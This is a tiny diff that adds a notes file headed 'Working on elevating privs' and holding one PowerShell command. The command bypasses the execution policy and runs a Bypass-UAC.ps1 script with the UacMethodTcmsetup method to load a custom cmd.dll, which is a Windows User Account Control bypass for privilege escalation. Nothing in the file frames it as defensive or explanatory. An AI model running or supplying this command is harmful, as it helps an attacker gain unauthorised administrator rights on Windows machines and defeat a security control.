@@ -1,0 +1,4 @@
+#Working on elevating privs
+
+powershell -executionpolicy bypass -File C:\Users\PC\Desktop\Tiked\client\rolling-win\Experimental\Bypass-UAC.ps1 -Method UacMethodTcmsetup -CustomDll C:\Users\b33f\Desktop\cmd.dll
+
